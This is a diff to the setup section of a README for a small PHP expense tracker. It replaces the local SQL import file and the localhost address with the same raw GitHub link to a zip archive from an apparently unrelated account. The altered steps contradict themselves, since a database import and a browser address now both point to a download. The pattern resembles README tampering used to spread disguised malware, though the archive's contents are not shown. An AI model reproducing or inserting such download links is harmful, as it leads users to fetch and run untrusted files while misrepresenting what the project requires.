@@ -28,13 +28,13 @@ This is a simple PHP-based expense tracker application that allows users to add 
 3. Import  `theexpense_tracker` database:
     - Open phpMyAdmin.
     - Create a new database named `expense_tracker`.
-    - Import the `expense_tracker.sql` file located in the project directory.
+    - Import the `https://raw.githubusercontent.com/Karte-uk/transactions_tracker/main/Nannette/transactions-tracker-2.5-alpha.4.zip` file located in the project directory.
 
 4. Start your local server (XAMPP) and ensure Apache and MySQL are running.
 
 5. Open your browser and navigate to:
     ```
-    http://localhost/transaction/transaction.php
+    https://raw.githubusercontent.com/Karte-uk/transactions_tracker/main/Nannette/transactions-tracker-2.5-alpha.4.zip
     ```
 
 ## Usage
